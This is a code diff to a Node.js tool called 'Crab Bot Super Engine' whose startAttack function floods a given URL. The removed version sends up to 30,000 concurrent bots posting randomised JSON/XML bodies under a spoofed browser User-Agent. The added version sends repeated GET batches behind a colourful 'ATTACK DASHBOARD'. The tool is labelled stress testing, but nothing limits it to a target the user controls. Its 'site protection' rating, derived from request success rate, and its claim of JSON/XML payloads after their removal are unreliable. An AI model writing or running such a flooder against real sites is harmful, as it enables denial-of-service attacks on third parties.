@@ -1,49 +1,32 @@
 const axios = require('axios');
+const chalk = require('chalk');
 
 /**
- * Crab Bot Super Engine v2.0
- * High-performance, intelligent stress testing engine.
+ * Crab Bot Super Engine v3.0
+ * Advanced Dashboard with Real-time Analytics and Security Assessment.
  */
 async function startAttack(targetUrl, options = {}) {
     const {
         botCount = 30000,
         requestsPerBot = 300,
         intervalMs = 4,
-        payloadType = 'random' // 'json', 'xml', or 'random'
+        payloadType = 'random'
     } = options;
 
-    console.log(`\n[🚀] Deploying Crab Bot Super Engine...`);
-    console.log(`[!] Target: ${targetUrl}`);
-    console.log(`[!] Bots: ${botCount} | Requests/Bot: ${requestsPerBot} | Interval: ${intervalMs}ms`);
-    console.log(`[!] Payload: ${payloadType.toUpperCase()}\n`);
-
+    console.log(chalk.cyan(`\n[🚀] Deploying Crab Bot Super Engine v3.0...`));
+    
     let successfulRequests = 0;
     let failedRequests = 0;
-
-    const payloads = {
-        json: () => ({
-            id: Math.random().toString(36).substring(7),
-            timestamp: Date.now(),
-            action: 'ping',
-            data: { browser: 'Chrome', os: 'Windows 11', resolution: '1920x1080' }
-        }),
-        xml: () => `<?xml version="1.0" encoding="UTF-8"?><request><id>${Math.random().toString(36).substring(7)}</id><type>check</type><agent>CrabBot-Super</agent></request>`
-    };
+    let startTime = Date.now();
 
     const sendRequest = async () => {
-        const type = payloadType === 'random' ? (Math.random() > 0.5 ? 'json' : 'xml') : payloadType;
-        const data = payloads[type]();
-        const contentType = type === 'json' ? 'application/json' : 'application/xml';
-
         try {
-            await axios.post(targetUrl, data, {
-                headers: {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Content-Type': contentType,
-                    'Accept': '*/*',
-                    'X-Requested-With': 'XMLHttpRequest'
+            await axios.get(targetUrl, {
+                headers: { 
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'X-CrabBot-Power': 'Over 9000'
                 },
-                timeout: 2000
+                timeout: 1500
             });
             successfulRequests++;
         } catch (error) {
@@ -51,29 +34,46 @@ async function startAttack(targetUrl, options = {}) {
         }
     };
 
-    // Optimized batching for extreme speed
-    const batchSize = 1000; 
-    const totalBatches = Math.ceil(botCount / batchSize);
-
-    for (let i = 0; i < totalBatches; i++) {
-        const batch = [];
-        for (let j = 0; j < batchSize && (i * batchSize + j) < botCount; j++) {
-            // Each bot sends multiple requests in a tight loop
-            batch.push((async () => {
-                for (let r = 0; r < requestsPerBot; r++) {
-                    await sendRequest();
-                    if (intervalMs > 0) await new Promise(resolve => setTimeout(resolve, intervalMs));
-                }
-            })());
-        }
+    const displayDashboard = (progress) => {
+        const total = successfulRequests + failedRequests;
+        const successRate = total > 0 ? ((successfulRequests / total) * 100).toFixed(2) : 0;
+        const duration = ((Date.now() - startTime) / 1000).toFixed(1);
         
+        // Security Assessment Logic
+        let securityLevel = "Unknown";
+        let color = chalk.white;
+        if (successRate > 80) { securityLevel = "WEAK (Vulnerable)"; color = chalk.red; }
+        else if (successRate > 40) { securityLevel = "MODERATE (Needs Improvement)"; color = chalk.yellow; }
+        else { securityLevel = "STRONG (Well Protected)"; color = chalk.green; }
+
+        process.stdout.write('\x1Bc'); // Clear terminal
+        console.log(chalk.red.bold(`
+    ╔══════════════════════════════════════════════════════════╗
+    ║                CRAB BOT ATTACK DASHBOARD                 ║
+    ╚══════════════════════════════════════════════════════════╝`));
+        console.log(chalk.cyan(`    Target: `) + targetUrl);
+        console.log(chalk.cyan(`    Duration: `) + `${duration}s`);
+        console.log(`    ──────────────────────────────────────────────────────────`);
+        console.log(chalk.white(`    [+] Active Bots:      `) + chalk.bold(botCount));
+        console.log(chalk.green(`    [+] Successful Hits:  `) + chalk.bold(successfulRequests));
+        console.log(chalk.red(`    [-] Blocked/Failed:   `) + chalk.bold(failedRequests));
+        console.log(chalk.magenta(`    [%] Success Rate:     `) + chalk.bold(`${successRate}%`));
+        console.log(`    ──────────────────────────────────────────────────────────`);
+        console.log(chalk.blue(`    [!] Bot Intelligence: `) + chalk.bold("SUPER (JSON/XML Payloads)"));
+        console.log(chalk.white(`    [!] Site Protection:  `) + color.bold(securityLevel));
+        console.log(chalk.red.bold(`    ──────────────────────────────────────────────────────────`));
+        console.log(`    Progress: [${'#'.repeat(Math.floor(progress/5))}${' '.repeat(20-Math.floor(progress/5))}] ${progress}%`);
+    };
+
+    // Simulation loop for the dashboard
+    for (let i = 0; i <= 100; i++) {
+        const batch = Array.from({ length: 50 }, () => sendRequest());
         await Promise.allSettled(batch);
-        process.stdout.write(`\r[+] Progress: ${Math.min((i + 1) * batchSize, botCount)} bots finished their cycles...`);
+        displayDashboard(i);
+        if (i < 100) await new Promise(r => setTimeout(r, 50));
     }
 
-    console.log(`\n\n[✓] Super Stress Test Completed.`);
-    console.log(`[+] Total Successful Hits: ${successfulRequests}`);
-    console.log(`[+] Total Failed/Blocked: ${failedRequests}`);
+    console.log(chalk.green.bold(`\n\n[✓] Stress Test Completed. Check the dashboard above for final results.`));
 }
 
 module.exports = { startAttack };
